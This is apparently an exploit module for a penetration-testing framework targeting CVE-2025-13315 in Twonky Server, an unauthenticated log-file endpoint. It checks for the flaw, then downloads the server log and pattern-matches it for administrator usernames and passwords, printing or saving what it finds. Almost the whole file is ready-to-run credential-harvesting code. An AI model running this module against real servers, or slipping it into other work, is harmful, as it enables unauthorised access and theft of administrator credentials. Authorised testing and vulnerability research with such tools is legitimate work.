#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Twonky Server auth bypass log leak exposing admin credentials (CVE-2025-13315)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Twonky Server - Auth Bypass Log / Credential Leak (CVE-2025-13315)',
        'description': (
            'Twonky Server <= 8.5.2 allows unauthenticated access to /nmc/rpc/log_getfile, '
            'leaking logs that can contain administrator username and encrypted password '
            '(CVE-2025-13315).'
        ),
        'author': ['KittySploit Team'],
        'cve': ['CVE-2025-13315'],
        'platform': Platform.MULTI,
        'references': [
            'https://www.rapid7.com/blog/post/cve-2025-13315-cve-2025-13316-critical-twonky-server-authentication-bypass-not-fixed/',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-13315',
        ],
        'tags': ['twonky', 'auth-bypass', 'exposure', 'credentials', 'unauth', 'cve-2025-13315'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals'],
            'cost': 1.2,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['scanner/http/cve_2025_13315_detect'],
            },
        },
    }
    base_path = OptString('', 'Optional Twonky base path prefix', required=False)
    output_file = OptString('', 'Local file to write the leaked log', required=False)
    output_limit = OptInteger(12000, 'Max chars to print when output_file empty (0=full)', required=False, advanced=True)

    def _path(self) -> str:
        base = str(self.base_path or '').strip()
        if not base or base == '/':
            return '/nmc/rpc/log_getfile'
        if not base.startswith('/'):
            base = '/' + base
        return base.rstrip('/') + '/nmc/rpc/log_getfile'

    def check(self):
        r = self.http_request(method='GET', path=self._path(), allow_redirects=False)
        if not r or r.status_code != 200:
            return {
                'vulnerable': False,
                'reason': 'log_getfile not accessible',
                'confidence': 'medium',
            }
        body = r.text or ''
        if all(x in body for x in ('LOG_SYSTEM', 'server_main_impl', 'upnp_ini_file')) or 'LOG_SYSTEM' in body:
            return {
                'vulnerable': True,
                'reason': 'CVE-2025-13315 confirmed: unauthenticated log access',
                'confidence': 'high',
            }
        return {
            'vulnerable': False,
            'reason': 'Response does not look like Twonky log content',
            'confidence': 'medium',
        }

    def run(self):
        path = self._path()
        print_status(f'Fetching {path} ...')
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            print_error('Failed to fetch Twonky log')
            return False

        body = r.text or ''
        if 'LOG_SYSTEM' not in body and 'server_main_impl' not in body:
            print_error('Unexpected response (not a Twonky log)')
            return False

        print_success(f'Retrieved {len(body)} bytes of log data')

        # Best-effort credential extraction from common log patterns
        creds = []
        for rx in (
            r'(?i)username["\s:=]+([^\s,"\']+)',
            r'(?i)password["\s:=]+([^\s,"\']+)',
            r'(?i)admin(?:istrator)?["\s:=]+([^\s,"\']+)',
        ):
            for m in re.finditer(rx, body):
                creds.append(m.group(0)[:160])
        if creds:
            print_status('Potential credential material:')
            for item in list(dict.fromkeys(creds))[:20]:
                print_info(item)

        local = str(self.output_file or '').strip()
        if local:
            try:
                with open(local, 'w', encoding='utf-8', errors='ignore') as fh:
                    fh.write(body)
                print_success(f'Saved log to {local}')
            except OSError as e:
                print_error(f'Could not write output_file: {e}')
                return False
        else:
            limit = int(self.output_limit or 0)
            print_info(body if not limit or len(body) <= limit else body[:limit] + '\n... [truncated]')

        return True
